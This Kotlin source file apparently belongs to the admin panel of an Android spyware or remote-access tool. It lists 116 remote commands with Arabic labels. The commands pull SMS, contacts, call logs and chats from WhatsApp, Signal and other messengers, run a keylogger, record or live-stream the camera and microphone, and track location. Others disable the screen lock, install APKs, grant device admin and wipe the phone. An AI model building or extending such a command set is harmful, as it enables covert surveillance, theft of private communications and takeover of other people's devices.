package com.abuzahra.admin.data.model

/**
 * Complete command definitions matching the server's COMMAND_REGISTRY.
 * All 116 commands organized by category.
 */
object CommandDefinitions {

    enum class Category(val displayName: String) {
        DATA("البيانات"),
        SOCIAL("التواصل الاجتماعي"),
        CONTROL("التحكم"),
        APPS("التطبيقات"),
        FILES("الملفات"),
        SECURITY("الأمان"),
        MONITOR("المراقبة"),
        STREAMING("البث")
    }

    data class CommandDef(
        val key: String,
        val name: String,
        val description: String,
        val category: Category
    )

    private val allCommands: List<CommandDef> = listOf(

        // ═══════════════════════════════════════════════════════════
        // DATA — 16 commands
        // ═══════════════════════════════════════════════════════════
        CommandDef("get_contacts", "جهات الاتصال", "استخراج جميع جهات الاتصال من الجهاز", Category.DATA),
        CommandDef("get_sms", "الرسائل القصيرة", "استخراج جميع الرسائل النصية القصيرة", Category.DATA),
        CommandDef("get_sms_inbox", "الرسائل الواردة", "استخراج الرسائل الواردة فقط", Category.DATA),
        CommandDef("get_sms_sent", "الرسائل المرسلة", "استخراج الرسائل المرسلة فقط", Category.DATA),
        CommandDef("get_call_log", "سجل المكالمات", "استخراج سجل المكالمات الكامل", Category.DATA),
        CommandDef("get_calendar", "التقويم", "استخراج أحداث التقويم والمواعيد", Category.DATA),
        CommandDef("get_notes", "الملاحظات", "استخراج الملاحظات المحفوظة على الجهاز", Category.DATA),
        CommandDef("get_browser_history", "سجل المتصفح", "استخراج سجل التصفح والمواقع المزارة", Category.DATA),
        CommandDef("get_wifi_networks", "شبكات Wi-Fi", "استخراج شبكات Wi-Fi المحفوظة", Category.DATA),
        CommandDef("get_bluetooth_devices", "أجهزة بلوتوث", "استخراج أجهزة البلوتوث المقترنة", Category.DATA),
        CommandDef("get_installed_apps", "التطبيقات المثبتة", "استخراج قائمة التطبيقات المثبتة على الجهاز", Category.DATA),
        CommandDef("get_device_info", "معلومات الجهاز", "استخراج المعلومات الكاملة للجهاز", Category.DATA),
        CommandDef("get_battery_info", "معلومات البطارية", "استخراج حالة البطارية ومستوى الشحن", Category.DATA),
        CommandDef("get_sim_info", "معلومات شريحة SIM", "استخراج معلومات شريحة SIM", Category.DATA),
        CommandDef("get_phone_number", "رقم الهاتف", "استخراج رقم الهاتف من الجهاز", Category.DATA),
        CommandDef("get_clipboard", "محتوى الحافظة", "استخراج النص المنسوخ في الحافظة", Category.DATA),

        // ═══════════════════════════════════════════════════════════
        // SOCIAL — 13 commands
        // ═══════════════════════════════════════════════════════════
        CommandDef("get_whatsapp", "واتساب", "استخراج محادثات ووسائط واتساب", Category.SOCIAL),
        CommandDef("get_telegram", "تيليجرام", "استخراج محادثات ووسائط تيليجرام", Category.SOCIAL),
        CommandDef("get_facebook_messenger", "فيسبوك ماسنجر", "استخراج محادثات فيسبوك ماسنجر", Category.SOCIAL),
        CommandDef("get_instagram", "انستغرام", "استخراج محادثات انستغرام دايركت", Category.SOCIAL),
        CommandDef("get_snapchat", "سناب شات", "استخراج رسائل سناب شات", Category.SOCIAL),
        CommandDef("get_viber", "فيبر", "استخراج محادثات ورسائل فيبر", Category.SOCIAL),
        CommandDef("get_signal", "سيجنال", "استخراج محادثات سيجنال المشفرة", Category.SOCIAL),
        CommandDef("get_skype", "سكايب", "استخراج محادثات سكايب", Category.SOCIAL),
        CommandDef("get_tiktok", "تيك توك", "استخراج رسائل وتفاعلات تيك توك", Category.SOCIAL),
        CommandDef("get_line", "لاين", "استخراج محادثات لاين", Category.SOCIAL),
        CommandDef("get_wechat", "وي تشات", "استخراج محادثات وي تشات", Category.SOCIAL),
        CommandDef("get_hangouts", "هانج آوتس", "استخراج محادثات جوجل هانج آوتس", Category.SOCIAL),
        CommandDef("get_discord", "ديسكورد", "استخراج محادثات ورسائل ديسكورد", Category.SOCIAL),

        // ═══════════════════════════════════════════════════════════
        // CONTROL — 32 commands
        // ═══════════════════════════════════════════════════════════
        CommandDef("take_screenshot", "لقطة شاشة", "التقاط لقطة شاشة للجهاز", Category.CONTROL),
        CommandDef("get_location", "الموقع الحالي", "الحصول على الموقع الجغرافي الحالي", Category.CONTROL),
        CommandDef("start_location_tracking", "تتبع الموقع", "بدء تتبع الموقع بشكل مستمر", Category.CONTROL),
        CommandDef("stop_location_tracking", "إيقاف التتبع", "إيقاف تتبع الموقع المستمر", Category.CONTROL),
        CommandDef("ring_device", "رنين الجهاز", "تشغيل رنين الجهاز بكامل الصوت", Category.CONTROL),
        CommandDef("vibrate_device", "اهتزاز الجهاز", "تشغيل اهتزاز الجهاز", Category.CONTROL),
        CommandDef("show_message", "إظهار رسالة", "عرض رسالة على شاشة الجهاز", Category.CONTROL),
        CommandDef("open_url", "فتح رابط", "فتح رابط في متصفح الجهاز", Category.CONTROL),
        CommandDef("send_sms", "إرسال رسالة نصية", "إرسال رسالة نصية قصيرة من الجهاز", Category.CONTROL),
        CommandDef("make_call", "إجراء مكالمة", "إجراء مكالمة هاتفية من الجهاز", Category.CONTROL),
        CommandDef("set_wallpaper", "تغيير الخلفية", "تغيير خلفية شاشة الجهاز", Category.CONTROL),
        CommandDef("set_ringtone", "تغيير نغمة الرنين", "تغيير نغمة رنين الجهاز", Category.CONTROL),
        CommandDef("set_clipboard", "تعيين الحافظة", "كتابة نص في حافظة الجهاز", Category.CONTROL),
        CommandDef("open_camera", "فتح الكاميرا", "فتح تطبيق الكاميرا على الجهاز", Category.CONTROL),
        CommandDef("toggle_flashlight", "تشغيل/إيقاف الكشاف", "تشغيل أو إيقاف ضوء الكشاف", Category.CONTROL),
        CommandDef("get_running_apps", "التطبيقات النشطة", "الحصول على قائمة التطبيقات قيد التشغيل", Category.CONTROL),
        CommandDef("force_stop_app", "إيقاف تطبيق قسرياً", "إيقاف تطبيق بشكل قسري", Category.CONTROL),
        CommandDef("clear_app_data", "مسح بيانات تطبيق", "مسح جميع بيانات تطبيق معين", Category.CONTROL),
        CommandDef("uninstall_app", "إلغاء تثبيت تطبيق", "إلغاء تثبيت تطبيق من الجهاز", Category.CONTROL),
        CommandDef("open_app", "فتح تطبيق", "فتح تطبيق على الجهاز", Category.CONTROL),
        CommandDef("restart_device", "إعادة تشغيل الجهاز", "إعادة تشغيل الجهاز", Category.CONTROL),
        CommandDef("lock_device", "قفل الجهاز", "قفل شاشة الجهاز", Category.CONTROL),
        CommandDef("wipe_device", "مسح الجهاز", "مسح جميع بيانات الجهاز بالكامل", Category.CONTROL),
        CommandDef("get_notifications", "الإشعارات", "استخراج جميع الإشعارات الحالية", Category.CONTROL),
        CommandDef("dismiss_notification", "إزالة إشعار", "إزالة إشعار معين من الجهاز", Category.CONTROL),
        CommandDef("reply_notification", "الرد على إشعار", "الرد على إشعار مباشرة", Category.CONTROL),
        CommandDef("press_button", "ضغط زر", "محاكاة ضغط زر على الجهاز", Category.CONTROL),
        CommandDef("swipe", "سحب الشاشة", "محاكاة سحب على الشاشة", Category.CONTROL),
        CommandDef("tap", "نقر على الشاشة", "محاكاة نقر على إحداثيات معينة", Category.CONTROL),
        CommandDef("type_text", "كتابة نص", "محاكاة كتابة نص على الجهاز", Category.CONTROL),
        CommandDef("get_screen_size", "حجم الشاشة", "الحصول على أبعاد الشاشة", Category.CONTROL),
        CommandDef("get_screen_density", "كثافة الشاشة", "الحصول على كثافة بكسلات الشاشة", Category.CONTROL),

        // ═══════════════════════════════════════════════════════════
        // APPS — 12 commands
        // ═══════════════════════════════════════════════════════════
        CommandDef("list_apps", "قائمة التطبيقات", "الحصول على قائمة كاملة بجميع التطبيقات", Category.APPS),
        CommandDef("app_info", "معلومات تطبيق", "الحصول على تفاصيل تطبيق معين", Category.APPS),
        CommandDef("install_app", "تثبيت تطبيق", "تثبيت تطبيق من رابط APK", Category.APPS),
        CommandDef("update_app", "تحديث تطبيق", "تحديث تطبيق إلى أحدث إصدار", Category.APPS),
        CommandDef("enable_app", "تفعيل تطبيق", "تفعيل تطبيق معطل", Category.APPS),
        CommandDef("disable_app", "تعطيل تطبيق", "تعطيل تطبيق على الجهاز", Category.APPS),
        CommandDef("clear_app_cache", "مسح ذاكرة التخزين المؤقت", "مسح ذاكرة التخزين المؤقت للتطبيق", Category.APPS),
        CommandDef("get_app_permissions", "صلاحيات التطبيق", "عرض صلاحيات تطبيق معين", Category.APPS),
        CommandDef("set_app_permission", "تعيين صلاحية", "تعيين أو إزالة صلاحية تطبيق", Category.APPS),
        CommandDef("get_app_data_usage", "استهلاك البيانات", "عرض استهلاك التطبيق للبيانات", Category.APPS),
        CommandDef("backup_app", "نسخ احتياطي للتطبيق", "أخذ نسخة احتياطية من تطبيق", Category.APPS),
        CommandDef("restore_app", "استعادة تطبيق", "استعادة تطبيق من نسخة احتياطية", Category.APPS),

        // ═══════════════════════════════════════════════════════════
        // FILES — 16 commands
        // ═══════════════════════════════════════════════════════════
        CommandDef("list_files", "عرض الملفات", "عرض الملفات والمجلدات في مسار معين", Category.FILES),
        CommandDef("download_file", "تحميل ملف", "تحميل ملف من الجهاز إلى الخادم", Category.FILES),
        CommandDef("upload_file", "رفع ملف", "رفع ملف من الخادم إلى الجهاز", Category.FILES),
        CommandDef("delete_file", "حذف ملف", "حذف ملف من الجهاز", Category.FILES),
        CommandDef("rename_file", "إعادة تسمية ملف", "إعادة تسمية ملف على الجهاز", Category.FILES),
        CommandDef("create_folder", "إنشاء مجلد", "إنشاء مجلد جديد على الجهاز", Category.FILES),
        CommandDef("get_file_info", "معلومات ملف", "الحصول على تفاصيل ملف معين", Category.FILES),
        CommandDef("copy_file", "نسخ ملف", "نسخ ملف إلى مسار آخر", Category.FILES),
        CommandDef("move_file", "نقل ملف", "نقل ملف إلى مسار آخر", Category.FILES),
        CommandDef("search_files", "البحث في الملفات", "البحث عن ملفات على الجهاز", Category.FILES),
        CommandDef("get_media", "الوسائط", "استخراج جميع ملفات الوسائط", Category.FILES),
        CommandDef("get_photos", "الصور", "استخراج جميع الصور من الجهاز", Category.FILES),
        CommandDef("get_videos", "الفيديوهات", "استخراج جميع الفيديوهات من الجهاز", Category.FILES),
        CommandDef("get_audio", "ملفات الصوت", "استخراج جميع ملفات الصوت من الجهاز", Category.FILES),
        CommandDef("get_documents", "المستندات", "استخراج المستندات من الجهاز", Category.FILES),
        CommandDef("delete_media", "حذف وسائط", "حذف ملف وسائط من الجهاز", Category.FILES),

        // ═══════════════════════════════════════════════════════════
        // SECURITY — 12 commands
        // ═══════════════════════════════════════════════════════════
        CommandDef("get_permissions", "الصلاحيات", "عرض جميع صلاحيات التطبيق", Category.SECURITY),
        CommandDef("request_permission", "طلب صلاحية", "طلب صلاحية جديدة من النظام", Category.SECURITY),
        CommandDef("check_root", "فحص الروت", "التحقق مما إذا كان الجهاز مروتاً", Category.SECURITY),
        CommandDef("enable_accessibility", "تفعيل إمكانية الوصول", "تفعيل خدمة إمكانية الوصول", Category.SECURITY),
        CommandDef("get_security_info", "معلومات الأمان", "الحصول على معلومات أمان الجهاز", Category.SECURITY),
        CommandDef("set_pin", "تعيين رقم PIN", "تعيين رمز PIN لقفل الشاشة", Category.SECURITY),
        CommandDef("change_password", "تغيير كلمة المرور", "تغيير كلمة مرور قفل الشاشة", Category.SECURITY),
        CommandDef("enable_lock", "تفعيل القفل", "تفعيل قفل شاشة الجهاز", Category.SECURITY),
        CommandDef("disable_lock", "تعطيل القفل", "تعطيل قفل شاشة الجهاز", Category.SECURITY),
        CommandDef("get_lock_info", "معلومات القفل", "الحصول على معلومات نوع القفل", Category.SECURITY),
        CommandDef("set_device_admin", "تعيين مسؤول الجهاز", "تفعيل التطبيق كمسؤول للجهاز", Category.SECURITY),
        CommandDef("remove_device_admin", "إزالة مسؤول الجهاز", "إزالة صلاحيات مسؤول الجهاز", Category.SECURITY),

        // ═══════════════════════════════════════════════════════════
        // MONITOR — 11 commands
        // ═══════════════════════════════════════════════════════════
        CommandDef("start_keylogger", "بدء تسجيل المفاتيح", "بدء تسجيل ضغطات المفاتيح", Category.MONITOR),
        CommandDef("stop_keylogger", "إيقاف تسجيل المفاتيح", "إيقاف تسجيل ضغطات المفاتيح", Category.MONITOR),
        CommandDef("get_keylog_data", "بيانات تسجيل المفاتيح", "استخراج بيانات تسجيل المفاتيح", Category.MONITOR),
        CommandDef("start_screen_record", "بدء تسجيل الشاشة", "بدء تسجيل فيديو لشاشة الجهاز", Category.MONITOR),
        CommandDef("stop_screen_record", "إيقاف تسجيل الشاشة", "إيقاف تسجيل شاشة الجهاز", Category.MONITOR),
        CommandDef("start_audio_record", "بدء تسجيل الصوت", "بدء تسجيل صوت من ميكروفون الجهاز", Category.MONITOR),
        CommandDef("stop_audio_record", "إيقاف تسجيل الصوت", "إيقاف تسجيل الصوت", Category.MONITOR),
        CommandDef("get_audio_recordings", "تسجيلات الصوت", "استخراج التسجيلات الصوتية المحفوظة", Category.MONITOR),
        CommandDef("start_camera_capture", "بدء التقاط الكاميرا", "بدء التقاط صور من كاميرا الجهاز", Category.MONITOR),
        CommandDef("stop_camera_capture", "إيقاف التقاط الكاميرا", "إيقاف التقاط الكاميرا", Category.MONITOR),
        CommandDef("monitor_app_usage", "مراقبة استخدام التطبيقات", "بدء مراقبة استخدام التطبيقات", Category.MONITOR),

        // ═══════════════════════════════════════════════════════════
        // STREAMING — 4 commands
        // ═══════════════════════════════════════════════════════════
        CommandDef("start_video_stream", "بدء بث الفيديو", "بدء بث مباشر من كاميرا الجهاز", Category.STREAMING),
        CommandDef("stop_video_stream", "إيقاف بث الفيديو", "إيقاف البث المباشر للفيديو", Category.STREAMING),
        CommandDef("start_audio_stream", "بدء بث الصوت", "بدء بث مباشر من ميكروفون الجهاز", Category.STREAMING),
        CommandDef("stop_audio_stream", "إيقاف بث الصوت", "إيقاف البث المباشر للصوت", Category.STREAMING)
    )

    /**
     * Map of category -> list of command definitions for quick lookup.
     */
    val commandsByCategory: Map<Category, List<CommandDef>> by lazy {
        Category.entries.associateWith { category ->
            allCommands.filter { it.category == category }
        }
    }

    /**
     * Find a command definition by its key.
     */
    fun findByKey(key: String): CommandDef? {
        return allCommands.find { it.key == key }
    }
}